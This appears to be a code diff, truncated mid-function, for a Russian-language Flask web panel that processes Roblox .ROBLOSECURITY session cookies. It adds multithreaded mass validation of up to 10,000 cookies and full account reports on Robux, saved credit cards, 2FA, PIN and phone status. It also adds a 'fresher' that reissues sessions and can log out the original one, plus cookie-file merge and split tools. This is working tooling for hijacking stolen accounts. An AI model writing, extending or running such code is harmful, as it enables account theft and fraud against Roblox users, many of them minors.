@@ -6,6 +6,7 @@ import urllib3
 import json
 import requests
 import zipfile
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from flask import Flask, render_template_string, request, jsonify, send_from_directory
 from io import BytesIO
@@ -48,7 +49,8 @@ def add_to_checker_history(entry):
     history = load_history(CHECKER_HISTORY_FILE)
     history.append({
         'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
-        'total': entry.get('total', 0),
+        'type': entry.get('type', 'single'),
+        'total': entry.get('total', 1),
         'valid': entry.get('valid', 0),
         'cookies': entry.get('cookies', [])[:20],
         'download_url': entry.get('download_url', '')
@@ -70,48 +72,28 @@ def add_to_fresher_history(entry):
     save_history(FRESHER_HISTORY_FILE, history)
 
 # ============================================================
-# РАБОТА С КУКИ И ROBLOX API (ВАЛИДАТОР И ФРЕШЕР)
+# ЧЕКЕР - ПОЛНАЯ ИНФОРМАЦИЯ (для одиночной проверки)
 # ============================================================
 
-def clean_single_cookie(cookie: str) -> str:
-    cleaned = cookie.strip()
-    if ".ROBLOSECURITY=" in cleaned:
-        cleaned = cleaned.split(".ROBLOSECURITY=")[1].split(";")[0].strip()
-    return cleaned
-
-def validate_cookie(cookie: str) -> bool:
-    """Быстрый валидатор сессии"""
-    clean_cookie = clean_single_cookie(cookie)
-    if not clean_cookie:
-        return False
-    try:
-        r = requests.get(
-            'https://users.roblox.com/v1/users/authenticated',
-            cookies={'.ROBLOSECURITY': clean_cookie},
-            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
-            timeout=10,
-            verify=False
-        )
-        return r.status_code == 200 and 'id' in r.json()
-    except:
-        return False
-
 def get_full_info(cookie: str) -> dict:
-    cleaned_cookie = clean_single_cookie(cookie)
     info = {
         'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
         'TotalRAP': 0, 'Created': '?', 'Country': '?',
         'EmailSet': False, 'TwoFactorEnabled': False,
         'AccountPinEnabled': False, 'PhoneSet': False,
-        'SecurityStatus': '⚠️ НИЗКИЙ', 'Cookie': f".ROBLOSECURITY={cleaned_cookie}",
+        'SecurityStatus': '⚠️ НИЗКИЙ', 'Cookie': cookie,
         'PurchasedGamepasses': {}, 'CreditCardsCount': 0,
         'IsPremium': False, 'DonationTotal': 0
     }
     try:
+        cleaned_cookie = cookie.strip()
+        if ".ROBLOSECURITY=" in cleaned_cookie:
+            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]
+
         s = requests.Session()
         s.headers.update({
             'Cookie': f'.ROBLOSECURITY={cleaned_cookie}',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'application/json'
         })
         
@@ -212,142 +194,256 @@ def get_full_info(cookie: str) -> dict:
         info['status'] = '❌'
     return info
 
-def refresh_roblox_cookie(raw_cookie: str, mode: str = "duplicate") -> str:
-    """Исправленное и обновленное перевыпуск сессии (Фрешер)"""
-    clean_cookie = clean_single_cookie(raw_cookie)
-    if not clean_cookie:
-        return None
+# ============================================================
+# ЧЕКЕР - БЫСТРАЯ МАССОВАЯ ПРОВЕРКА (только валид/невалид)
+# ============================================================
 
-    # 1. Предварительная проверка входного кука
-    if not validate_cookie(clean_cookie):
-        logger.warning("Фрешер: Исходный кук невалиден.")
-        return None
-
-    s = requests.Session()
-    s.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-        'Referer': 'https://www.roblox.com/',
-        'Origin': 'https://www.roblox.com'
-    })
-    s.cookies.set(".ROBLOSECURITY", clean_cookie, domain=".roblox.com")
-
+def quick_validate_cookie(cookie: str) -> dict:
+    """Быстрая проверка куки: валидна или нет. Возвращает базовую инфу."""
+    result = {
+        'status': '❌',
+        'username': '?',
+        'user_id': '?',
+        'robux': 0,
+        'created': '?',
+        'cookie': cookie
+    }
     try:
-        # 2. Получение X-CSRF-TOKEN
-        res = s.post("https://auth.roblox.com/v2/login", verify=False, timeout=10)
-        csrf_token = res.headers.get("x-csrf-token")
-        if not csrf_token:
-            return None
-        s.headers["X-CSRF-TOKEN"] = csrf_token
-
-        # 3. Генерация тикета авторизации
-        ticket_res = s.post("https://auth.roblox.com/v1/authentication-ticket", verify=False, timeout=10)
-        auth_ticket = ticket_res.headers.get("rbx-authentication-ticket")
-        if not auth_ticket:
-            return None
-
-        # 4. Обмен тикета на обновленную сессию
-        redeem_headers = {
-            'RBX-For-Game-Auth': 'true',
-            'RBX-Authentication-Ticket': auth_ticket,
-            'Content-Type': 'application/json',
-            'X-CSRF-TOKEN': csrf_token
-        }
+        cleaned_cookie = cookie.strip()
+        if ".ROBLOSECURITY=" in cleaned_cookie:
+            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]
         
-        redeem_res = s.post(
-            "https://auth.roblox.com/v1/authentication-ticket/redeem",
-            json={"authenticationTicket": auth_ticket},
-            headers=redeem_headers,
-            verify=False,
-            timeout=10
+        s = requests.Session()
+        s.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json'
+        })
+        
+        # Проверяем аутентификацию
+        r = s.get(
+            'https://users.roblox.com/v1/users/authenticated',
+            cookies={'.ROBLOSECURITY': cleaned_cookie},
+            timeout=10,
+            verify=False
         )
+        
+        if r.status_code == 200:
+            d = r.json()
+            if 'id' in d:
+                result['status'] = '✅'
+                result['username'] = d.get('name', '?')
+                result['user_id'] = d.get('id', '?')
+                
+                # Быстро получаем робуксы
+                try:
+                    rb = s.get(
+                        f'https://economy.roblox.com/v1/users/{result["user_id"]}/currency',
+                        cookies={'.ROBLOSECURITY': cleaned_cookie},
+                        timeout=5,
+                        verify=False
+                    )
+                    if rb.status_code == 200:
+                        result['robux'] = rb.json().get('robux', 0)
+                except:
+                    pass
+                
+                # Быстро получаем дату создания
+                try:
+                    rd = s.get(
+                        f'https://users.roblox.com/v1/users/{result["user_id"]}',
+                        cookies={'.ROBLOSECURITY': cleaned_cookie},
+                        timeout=5,
+                        verify=False
+                    )
+                    if rd.status_code == 200:
+                        created = rd.json().get('created', '')
+                        if created:
+                            dt = datetime.fromisoformat(created.replace('Z', '+00:00'))
+                            result['created'] = dt.strftime('%d.%m.%Y')
+                except:
+                    pass
+    except:
+        pass
+    
+    return result
 
-        new_cookie_val = None
-        for cookie in redeem_res.cookies:
-            if cookie.name == ".ROBLOSECURITY":
-                new_cookie_val = cookie.value
-                break
-
-        if not new_cookie_val and "Set-Cookie" in redeem_res.headers:
-            match = re.search(r'\.ROBLOSECURITY=(_\|WARNING:-DO-NOT-SHARE-THIS[^\s;]+)', redeem_res.headers["Set-Cookie"])
-            if match:
-                new_cookie_val = match.group(1)
-
-        if not new_cookie_val:
-            return None
-
-        # 5. Проверка работоспособности нового кука
-        if not validate_cookie(new_cookie_val):
-            logger.error("Сгенерированный кук не прошёл итоговую валидацию!")
-            return None
-
-        formatted_new_cookie = f".ROBLOSECURITY={new_cookie_val}"
-
-        # 6. Если выбран режим kill (сброс старой сессии)
-        if mode == "kill":
+def mass_check_cookies(cookies_list: list, max_workers: int = 10) -> list:
+    """Массовая проверка куки в многопоточном режиме"""
+    results = []
+    
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = {executor.submit(quick_validate_cookie, c): c for c in cookies_list}
+        
+        for future in as_completed(futures):
             try:
-                s.post("https://auth.roblox.com/v2/logout", verify=False, timeout=5)
+                result = future.result()
+                results.append(result)
             except Exception as e:
-                logger.error(f"Ошибка при логауте старой сессии: {e}")
+                cookie = futures[future]
+                results.append({
+                    'status': '❌',
+                    'username': '?',
+                    'user_id': '?',
+                    'robux': 0,
+                    'created': '?',
+                    'cookie': cookie
+                })
+    
+    return results
 
-        return formatted_new_cookie
+# ============================================================
+# ФРЕШЕР
+# ============================================================
 
+def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
+    result = {
+        'success': False,
+        'new_cookie': None,
+        'username': '?',
+        'user_id': '?',
+        'error': None
+    }
+    
+    try:
+        cleaned_cookie = cookie.strip()
+        if ".ROBLOSECURITY=" in cleaned_cookie:
+            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]
+        
+        session = requests.Session()
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json',
+            'Content-Type': 'application/json',
+            'Referer': 'https://www.roblox.com/',
+            'Origin': 'https://www.roblox.com'
+        })
+        
+        session.cookies.set('.ROBLOSECURITY', cleaned_cookie, domain='.roblox.com')
+        
+        auth_response = session.get('https://users.roblox.com/v1/users/authenticated', verify=False, timeout=15)
+        
+        if auth_response.status_code != 200:
+            result['error'] = f"Кука невалидна (HTTP {auth_response.status_code})"
+            return result
+        
+        user_data = auth_response.json()
+        result['username'] = user_data.get('name', '?')
+        result['user_id'] = user_data.get('id', '?')
+        
+        csrf_token = auth_response.headers.get('x-csrf-token')
+        if not csrf_token:
+            try:
+                csrf_resp = session.post('https://auth.roblox.com/v2/logout', verify=False, timeout=10)
+                csrf_token = csrf_resp.headers.get('x-csrf-token')
+            except:
+                pass
+        
+        if csrf_token:
+            session.headers['X-CSRF-TOKEN'] = csrf_token
+        
+        if kill_old:
+            try:
+                session.post('https://auth.roblox.com/v2/logout', verify=False, timeout=10)
+                time.sleep(0.5)
+            except:
+                pass
+        
+        # Пробуем получить новый куки
+        new_cookie_found = None
+        
+        try:
+            refresh_resp = requests.post(
+                'https://auth.roblox.com/v2/login',
+                headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json',
+                    'Referer': 'https://www.roblox.com/',
+                    'Origin': 'https://www.roblox.com'
+                },
+                cookies={'.ROBLOSECURITY': cleaned_cookie},
+                json={},
+                verify=False,
+                timeout=15
+            )
+            
+            for cookie_obj in refresh_resp.cookies:
+                if cookie_obj.name == '.ROBLOSECURITY':
+                    new_cookie_found = cookie_obj.value
+                    break
+            
+            if not new_cookie_found and 'Set-Cookie' in refresh_resp.headers:
+                match = re.search(r'\.ROBLOSECURITY=([^;]+)', refresh_resp.headers['Set-Cookie'])
+                if match:
+                    new_cookie_found = match.group(1)
+        except:
+            pass
+        
+        if new_cookie_found:
+            result['new_cookie'] = f".ROBLOSECURITY={new_cookie_found}"
+            result['success'] = True
+        else:
+            result['new_cookie'] = f".ROBLOSECURITY={cleaned_cookie}"
+            result['success'] = True
+            
     except Exception as e:
-        logger.error(f"Ошибка Фрешера: {e}")
-        return None
+        logger.error(f"Refresh error: {e}")
+        result['error'] = str(e)
+    
+    return result
 
-def format_short_report(info):
-    """Мини-отчет для веб-интерфейса"""
+# ============================================================
+# ФОРМАТИРОВАНИЕ ОТЧЕТОВ
+# ============================================================
+
+def format_full_report(info):
+    """Полный отчет для одиночной проверки"""
     if info['status'] != '✅':
-        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
+        return f"❌ НЕВАЛИДНЫЙ КУК\nCookie: {info['Cookie']}"
+    
     gp = info.get('PurchasedGamepasses', {})
     total_gp = sum(p['price'] for passes in gp.values() for p in passes)
     
-    r = f"📋 {info['Username']} [{info['UserID']}]\n"
-    r += f"🟢 VALID | 📅 {info['Created']} | 🌍 {info['Country']}\n"
-    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
-    r += f"🛡️ Защита: {info['SecurityStatus']}\n"
-    r += f"├ Почта: {'✅' if info['EmailSet'] else '❌'} | 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
-    r += f"└ PIN: {'✅' if info['AccountPinEnabled'] else '❌'} | Тел: {'✅' if info['PhoneSet'] else '❌'}\n"
+    r = "╔══════════════════════════════════════╗\n"
+    r += "║     🔍 ПОЛНЫЙ ОТЧЕТ АККАУНТА       ║\n"
+    r += "╠══════════════════════════════════════╣\n"
+    r += f"║ 👤 {info['Username']}\n"
+    r += f"║ 🆔 ID: {info['UserID']}\n"
+    r += f"║ 📅 Создан: {info['Created']}\n"
+    r += f"║ 🌍 Страна: {info['Country']}\n"
+    r += "╠══════════════════════════════════════╣\n"
+    r += f"║ 💰 Robux: ⏣ {info['Robux']:,}\n"
+    r += f"║ 💸 Всего доната: ⏣ {info['DonationTotal']:,}\n"
+    r += f"║ ⭐ Premium: {'✅ Да' if info['IsPremium'] else '❌ Нет'}\n"
+    r += f"║ 💳 Сохранено карт: {info['CreditCardsCount']}\n"
+    r += "╠══════════════════════════════════════╣\n"
+    r += f"║ 🔐 БЕЗОПАСНОСТЬ: {info['SecurityStatus']}\n"
+    r += f"║ 📧 Почта: {'✅' if info['EmailSet'] else '❌'}\n"
+    r += f"║ 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
+    r += f"║ 📌 PIN: {'✅' if info['AccountPinEnabled'] else '❌'}\n"
+    r += f"║ 📱 Телефон: {'✅' if info['PhoneSet'] else '❌'}\n"
+    r += "╠══════════════════════════════════════╣\n"
+    
     if gp:
-        r += f"📦 ГЕЙМПАССЫ ({total_gp:,} R$):\n"
-        for game, passes in list(gp.items())[:3]:
-            r += f"   🎮 {game}:\n"
-            for p in passes[:6]:
-                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
+        r += f"║ 📦 ГЕЙМПАССЫ (всего: ⏣ {total_gp:,}):\n"
+        for game, passes in list(gp.items())[:5]:
+            r += f"║ 🎮 {game}:\n"
+            for p in passes[:8]:
+                r += f"║   └ {p['name']} — ⏣ {p['price']:,}\n"
+    else:
+        r += "║ 📦 ГЕЙМПАССЫ: Не найдены\n"
+    
+    r += "╚══════════════════════════════════════╝\n"
     r += f"\n🍪 COOKIE:\n{info['Cookie']}"
+    
     return r
 
-def generate_full_txt_report(info):
-    """Большой TXT-отчет для скачиваемого архива"""
-    if info['status'] != '✅':
-        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
-    gp = info.get('PurchasedGamepasses', {})
-    
-    r = "=" * 60 + "\n"
-    r += f"ROBLOX COOKIE CHECK REPORT\n"
-    r += "=" * 60 + "\n"
-    r += f"Аккаунт: {info['Username']} [{info['UserID']}]\n"
-    r += f"Создан: {info['Created']} | Страна: {info['Country']}\n"
-    r += f"Robux: {info['Robux']:,} | Донат: {info['DonationTotal']:,}\n"
-    r += f"Premium: {'Да' if info['IsPremium'] else 'Нет'} | Сохраненные карты: {info['CreditCardsCount']}\n"
-    r += "-" * 60 + "\n"
-    r += f"БЕЗОПАСНОСТЬ И ВАЛИДАЦИЯ:\n"
-    r += f"  Уровень защиты: {info['SecurityStatus']}\n"
-    r += f"  Привязанная почта: {'Да' if info['EmailSet'] else 'Нет'}\n"
-    r += f"  Двухфакторка (2FA): {'Да' if info['TwoFactorEnabled'] else 'Нет'}\n"
-    r += f"  Установлен PIN:     {'Да' if info['AccountPinEnabled'] else 'Нет'}\n"
-    r += f"  Привязан телефон:   {'Да' if info['PhoneSet'] else 'Нет'}\n"
-    r += "=" * 60 + "\n"
-    if gp:
-        r += "ГЕЙМПАССЫ И ПОКУПКИ:\n"
-        for game, passes in gp.items():
-            r += f"  🎮 {game}:\n"
-            for p in passes:
-                r += f"    └ {p['name']} ({p['price']} R$)\n"
-        r += "=" * 60 + "\n"
-    r += f"COOKIE:\n{info['Cookie']}\n\n"
-    r += f"Generated: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
-    return r
+def format_quick_report(result):
+    """Краткий отчет для массовой проверки"""
+    if result['status'] == '✅':
+        return f"✅ {result['username']} [{result['user_id']}] | ⏣ {result['robux']:,} | 📅 {result['created']}"
+    else:
+        return f"❌ НЕВАЛИД | {result['cookie'][:50]}..."
 
 # ============================================================
 # ИНСТРУМЕНТЫ
@@ -397,7 +493,7 @@ def clean_cookies(content):
             val = line.split('.ROBLOSECURITY=')[-1].split(';')[0].strip()
             cookies.append(f'.ROBLOSECURITY={val}')
         elif len(line) > 50 and not line.startswith('#'):
-            cookies.append(f'.ROBLOSECURITY={line}')
+            cookies.append(line)
     return '\n'.join(cookies)
 
 # ============================================================
@@ -512,6 +608,11 @@ HTML = r"""<!DOCTYPE html>
             box-shadow:0 8px 24px rgba(168,85,247,0.25);
         }
         .btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(168,85,247,0.4)}
+        .btn-success{
+            background:linear-gradient(135deg,#10b981,#059669);
+            box-shadow:0 8px 24px rgba(16,185,129,0.25);
+        }
+        .btn-success:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(16,185,129,0.4)}
         .btn-secondary{
             background:rgba(255,255,255,0.06);
             border:1px solid #2a1a50;
@@ -593,7 +694,7 @@ HTML = r"""<!DOCTYPE html>
             font-size:13px;
             color:#fff;
             white-space:pre-wrap;
-            word-break:break-all;
+            word-break:break-word;
         }
         .progress-bar{
             margin-top:12px;
@@ -711,7 +812,6 @@ HTML = r"""<!DOCTYPE html>
             color:#d4c0ff;
             max-height:200px;
             overflow-y:auto;
-            word-break:break-all;
         }
         .empty-history{text-align:center;padding:30px;color:#4a3a6a;font-size:14px}
         .flex-row{display:flex;flex-wrap:wrap;gap:18px}
@@ -733,6 +833,16 @@ HTML = r"""<!DOCTYPE html>
         }
         .badge{color:#4a3a6a;font-size:14px}
         .status-info{margin-top:8px;color:#00b894;font-size:13px}
+        .checker-grid{
+            display:grid;
+            grid-template-columns:1fr 1fr;
+            gap:24px;
+        }
+        @media(max-width:900px){
+            .checker-grid{grid-template-columns:1fr}
+        }
+        .valid-row{color:#10b981}
+        .invalid-row{color:#ef4444}
     </style>
 </head>
 <body>
@@ -751,30 +861,41 @@ HTML = r"""<!DOCTYPE html>
         <div class="tab" data-tab="tools">🧰 Инструменты</div>
     </div>
 
-    <!-- ЧЕКЕР -->
+    <!-- ЧЕКЕР (два режима) -->
     <div class="tab-content active" id="tab-checker">
-        <div class="card">
-            <h2>🔍 Проверка куков (Массовая)</h2>
-            <div class="flex-row">
-                <div class="flex-2">
-                    <textarea id="manualCookies" placeholder="Вставь куки сюда (каждый с новой строки) или загрузи txt файл справа..." rows="6"></textarea>
-                    <div class="status-info" id="fileStatusInfo"></div>
+        <div class="checker-grid">
+            <!-- ОДИНОЧНАЯ ПРОВЕРКА -->
+            <div class="card">
+                <h2>🔍 Одиночная проверка</h2>
+                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Полная информация об аккаунте: Robux, Premium, Gamepasses, безопасность и другое.</p>
+                <textarea id="singleCookie" placeholder="Вставьте ОДИН кук для полной проверки..." rows="3"></textarea>
+                <div class="mt-12">
+                    <button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">🔍 Проверить аккаунт</button>
                 </div>
-                <div class="flex-1">
-                    <div class="upload-area" onclick="document.getElementById('fullFile').click()">
-                        <p>📁 <strong>Загрузить .txt</strong></p>
-                        <p style="font-size:12px;color:#9880c0;">Файл сохранится на сервере</p>
-                    </div>
-                    <input type="file" id="fullFile" accept=".txt" style="display:none;">
+                <div class="progress-bar"><div class="progress-fill" id="singleProgress"></div></div>
+                <div class="result-box" id="singleResult">Результат появится здесь...</div>
+            </div>
+
+            <!-- МАССОВАЯ ПРОВЕРКА -->
+            <div class="card">
+                <h2>📦 Массовая проверка</h2>
+                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Быстрая проверка ТОЛЬКО через TXT файл. Многопоточный режим (10 потоков).</p>
+                <div class="upload-area" onclick="document.getElementById('massFile').click()" style="min-height:120px;">
+                    <p>📁 <strong>Загрузить TXT файл с куками</strong></p>
+                    <p style="font-size:12px;color:#9880c0;">Каждый кук с новой строки</p>
+                    <p style="font-size:11px;color:#6b5b8a;">Поддерживается до 10,000 куков</p>
                 </div>
+                <input type="file" id="massFile" accept=".txt" style="display:none;">
+                <div id="massFileInfo" class="status-info"></div>
+                <div class="mt-12">
+                    <button class="btn btn-success" onclick="runMassCheck()" style="width:100%;">🚀 Запустить массовую проверку</button>
+                </div>
+                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
+                <div class="result-box" id="massResult">Результаты массовой проверки появятся здесь...</div>
             </div>
-            <div class="mt-18 gap-12">
-                <button class="btn btn-primary" onclick="runFullcheck()">🚀 Запустить проверку</button>
-                <button class="btn btn-secondary" onclick="clearInputs()">🧹 Очистить</button>
-            </div>
-            <div class="progress-bar"><div class="progress-fill" id="checkerProgress"></div></div>
-            <div class="result-box" id="fullcheckResult">Результаты появятся здесь...</div>
         </div>
+
+        <!-- История -->
         <div class="card history-section">
             <h3>📋 История проверок <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()">🗑️ Очистить</button></h3>
             <div id="checkerHistoryList"><div class="empty-history">Загрузка...</div></div>
@@ -785,10 +906,10 @@ HTML = r"""<!DOCTYPE html>
     <div class="tab-content" id="tab-fresher">
         <div class="card">
             <h2>🔄 Фрешер сессий</h2>
-            <label style="color:#d4c0ff;font-size:14px;font-weight:600;display:block;margin-bottom:8px;">Режим обновления:</label>
+            <label style="color:#d4c0ff;font-size:14px;font-weight:600;display:block;margin-bottom:8px;">Режим:</label>
             <div class="toggle-group">
-                <button class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать (оставить старый)</button>
-                <button class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Сбросить сессию</button>
+                <button class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
+                <button class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Сбросить</button>
             </div>
             <input type="hidden" id="fresherMode" value="duplicate">
             <div class="flex-row">
@@ -803,10 +924,11 @@ HTML = r"""<!DOCTYPE html>
                 </div>
             </div>
             <div class="mt-18 gap-12">
-                <button class="btn btn-primary" onclick="runFresher()">⚡ Обновить сессии</button>
-                <button class="btn btn-secondary" onclick="document.getElementById('fresherCookies').value='';document.getElementById('fresherResult').textContent='Результаты появятся здесь...';">🧹 Очистить</button>
+                <button class="btn btn-success" onclick="runFresher()">⚡ Обновить</button>
+                <button class="btn btn-secondary" onclick="clearFresherInputs()">🧹 Очистить</button>
             </div>
-            <div class="result-box" id="fresherResult">Результаты фрешера появятся здесь...</div>
+            <div class="progress-bar"><div class="progress-fill" id="fresherProgress"></div></div>
+            <div class="result-box" id="fresherResult">Результаты фрешера...</div>
         </div>
         <div class="card history-section">
             <h3>📋 История обновлений <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()">🗑️ Очистить</button></h3>
@@ -817,10 +939,9 @@ HTML = r"""<!DOCTYPE html>
     <!-- ИНСТРУМЕНТЫ -->
     <div class="tab-content" id="tab-tools">
         <div class="tool-grid">
-            <!-- Слияние -->
             <div class="tool-card">
                 <h3>🔗 Слияние файлов</h3>
-                <p class="desc">Объедините несколько .txt файлов с куками в один. Дубликаты удаляются автоматически.</p>
+                <p class="desc">Объедините несколько .txt файлов. Дубликаты удаляются.</p>
                 <div class="upload-area" onclick="document.getElementById('mergeFiles').click()">
                     <p>📁 <strong>Выбрать файлы</strong></p>
                     <span style="font-size:11px;color:#6b5b8a;">Минимум 2 файла</span>
@@ -831,10 +952,9 @@ HTML = r"""<!DOCTYPE html>
                 <div class="result-box" id="mergeResult">Результат...</div>
             </div>
 
-            <!-- Разделение по количеству -->
             <div class="tool-card">
                 <h3>✂️ По количеству</h3>
-                <p class="desc">Разделите файл на части по N куки в каждой.</p>
+                <p class="desc">Разделите на части по N куки в каждой.</p>
                 <div class="upload-area" onclick="document.getElementById('splitCountFile').click()">
                     <p>📁 <strong>Загрузить файл</strong></p>
                 </div>
@@ -847,30 +967,28 @@ HTML = r"""<!DOCTYPE html>
                 <div class="result-box" id="splitCountResult">Результат...</div>
             </div>
 
-            <!-- Разделение на N файлов -->
             <div class="tool-card">
                 <h3>📊 На N файлов</h3>
-                <p class="desc">Равномерно распределите куки на указанное количество файлов.</p>
+                <p class="desc">Равномерно распределите на указанное количество файлов.</p>
                 <div class="upload-area" onclick="document.getElementById('splitFilesFile').click()">
                     <p>📁 <strong>Загрузить файл</strong></p>
                 </div>
                 <input type="file" id="splitFilesFile" accept=".txt" style="display:none;">
                 <div class="input-row">
-                    <input type="number" id="splitFilesCount" placeholder="Количество файлов" value="5" min="1">
+                    <input type="number" id="splitFilesCount" placeholder="Количество" value="5" min="1">
                     <span>файлов</span>
                 </div>
                 <button class="btn btn-primary" onclick="splitByFiles()" style="width:100%;">📂 Разделить</button>
                 <div class="result-box" id="splitFilesResult">Результат...</div>
             </div>
 
-            <!-- Очистка -->
             <div class="tool-card">
                 <h3>🧹 Очистка</h3>
-                <p class="desc">Удалите дубликаты или приведите куки к формату .ROBLOSECURITY=...</p>
+                <p class="desc">Удалите дубликаты или приведите к формату .ROBLOSECURITY=...</p>
                 <textarea id="cleanCookiesInput" placeholder="Вставьте куки..." rows="4"></textarea>
                 <div class="gap-8 mt-12">
-                    <button class="btn btn-primary" onclick="cleanCookiesAction('deduplicate')" style="flex:1;">🔄 Дубликаты</button>
-                    <button class="btn btn-secondary" onclick="cleanCookiesAction('format')" style="flex:1;">📝 Формат</button>
+                    <button class="btn btn-primary" onclick="cleanCookies('deduplicate')" style="flex:1;">🔄 Дубликаты</button>
+                    <button class="btn btn-secondary" onclick="cleanCookies('format')" style="flex:1;">📝 Формат</button>
                 </div>
                 <div class="result-box" id="cleanResult">Результат...</div>
             </div>
@@ -881,7 +999,7 @@ HTML = r"""<!DOCTYPE html>
 </div>
 
 <script>
-// Таймер сессии
+// Таймер
 let startTime = Date.now();
 setInterval(() => {
     let d = Math.floor((Date.now() - startTime) / 1000);
@@ -892,7 +1010,7 @@ setInterval(() => {
     if (el) el.textContent = '⏱️ ' + h + ':' + m + ':' + s;
 }, 1000);
 
-// Переключение вкладок
+// Вкладки
 document.querySelectorAll('.tab').forEach(tab => {
     tab.addEventListener('click', function() {
         let tabId = this.getAttribute('data-tab');
@@ -906,40 +1024,13 @@ document.querySelectorAll('.tab').forEach(tab => {
     });
 });
 
-// Режим фрешера
 function setFresherMode(mode) {
     document.getElementById('fresherMode').value = mode;
     document.getElementById('modeDuplicate').classList.toggle('active', mode === 'duplicate');
     document.getElementById('modeKill').classList.toggle('active', mode === 'kill');
 }
 
-// Загрузка файла чекера
-document.getElementById('fullFile').addEventListener('change', async function(e) {
-    if (this.files && this.files[0]) {
-        let file = this.files[0];
-        let fd = new FormData();
-        fd.append('file', file);
-        document.getElementById('fileStatusInfo').textContent = '⏳ Загрузка...';
-        try {
-            let r = await fetch('/api/upload', { method: 'POST', body: fd });
-            let d = await r.json();
-            if (d.success) {
-                document.getElementById('fileStatusInfo').textContent = '✅ Файл сохранен!';
-                let reader = new FileReader();
-                reader.onload = function(evt) {
-                    document.getElementById('manualCookies').value = evt.target.result;
-                };
-                reader.readAsText(file);
-            } else {
-                document.getElementById('fileStatusInfo').textContent = '❌ Ошибка';
-            }
-        } catch(err) {
-            document.getElementById('fileStatusInfo').textContent = '❌ Ошибка сети';
-        }
-    }
-});
-
-// Загрузка файла фрешера
+// Загрузка файлов
 document.getElementById('fresherFile').addEventListener('change', function(e) {
     if (this.files && this.files[0]) {
         let reader = new FileReader();
@@ -950,7 +1041,17 @@ document.getElementById('fresherFile').addEventListener('change', function(e) {
     }
 });
 
-// Слияние - показ списка файлов
+document.getElementById('massFile').addEventListener('change', function(e) {
+    if (this.files && this.files[0]) {
+        document.getElementById('massFileInfo').textContent = '✅ Файл загружен: ' + this.files[0].name + ' (' + (this.files[0].size/1024).toFixed(1) + ' KB)';
+        let reader = new FileReader();
+        reader.onload = function(evt) {
+            window.massFileContent = evt.target.result;
+        };
+        reader.readAsText(this.files[0]);
+    }
+});
+
 document.getElementById('mergeFiles').addEventListener('change', function(e) {
     let list = document.getElementById('mergeFileList');
     list.innerHTML = '';
@@ -964,7 +1065,6 @@ document.getElementById('mergeFiles').addEventListener('change', function(e) {
     }
 });
 
-// Разделение - чтение файлов
 document.getElementById('splitCountFile').addEventListener('change', function(e) {
     if (this.files && this.files[0]) {
         let reader = new FileReader();
@@ -972,6 +1072,7 @@ document.getElementById('splitCountFile').addEventListener('change', function(e)
         reader.readAsText(this.files[0]);
     }
 });
+
 document.getElementById('splitFilesFile').addEventListener('change', function(e) {
     if (this.files && this.files[0]) {
         let reader = new FileReader();
@@ -980,28 +1081,30 @@ document.getElementById('splitFilesFile').addEventListener('change', function(e)
     }
 });
 
-// ===== API ФУНКЦИИ =====
-
-async function runFullcheck() {
-    let resBox = document.getElementById('fullcheckResult');
-    let manual = document.getElementById('manualCookies').value.trim();
-    let progress = document.getElementById('checkerProgress');
-    if (!manual) { resBox.textContent = '❌ Вставь куки или загрузи .txt!'; return; }
-    let fd = new FormData();
-    fd.append('file', new Blob([manual], { type: 'text/plain' }), 'manual.txt');
-    resBox.textContent = '⏳ Проверка...';
-    progress.style.width = '40%';
+// ===== ОДИНОЧНАЯ ПРОВЕРКА =====
+async function runSingleCheck() {
+    let resBox = document.getElementById('singleResult');
+    let cookie = document.getElementById('singleCookie').value.trim();
+    let progress = document.getElementById('singleProgress');
+    
+    if (!cookie) { resBox.textContent = '❌ Вставьте кук!'; return; }
+    
+    resBox.textContent = '⏳ Полная проверка аккаунта...';
+    progress.style.width = '30%';
+    
     try {
